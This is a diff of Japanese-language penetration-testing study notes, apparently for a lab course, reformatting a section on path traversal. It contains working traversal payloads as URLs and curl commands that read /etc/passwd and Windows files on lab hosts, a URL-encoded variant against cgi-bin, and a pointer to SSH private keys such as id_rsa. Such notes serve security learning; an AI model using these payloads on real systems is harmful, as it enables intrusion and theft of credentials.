@@ -18,7 +18,7 @@ cat ../../etc/passwd
 パラメータを利用した悪用例
 Webアプリケーションでパラメータが悪用される可能性があります。以下はその例です：
 
-http
+- http
 ```bash
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
 ```
@@ -27,23 +27,23 @@ http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc
 特定のファイルが存在するか確認するために、id_rsaやid_ecdsaなどのファイルをチェックすることが重要です。
 出力が正しくフォーマットされない場合
 出力が正しく表示されない場合は、curlを使用して内容を確認することができます：
-
 ```bash
 curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
-Windows環境での悪用
+```
+#### Windows環境での悪用
 Windows環境では、ドライブ指定が不要なため、以下のように悪用できます：
-
-http
-
+- http
+```bash
 http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
-URLエンコード
+```
+#### URLエンコード
 パスが表示されない場合
 パスが直接表示されない場合は、URLエンコードを使用してパスをエンコードします：
 
 ```bash
-
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-WordPressの脆弱性
+```
+#### WordPressの脆弱性
 簡単なエクスプロイト
 WordPressの脆弱性を利用する簡単なエクスプロイト例です：
 
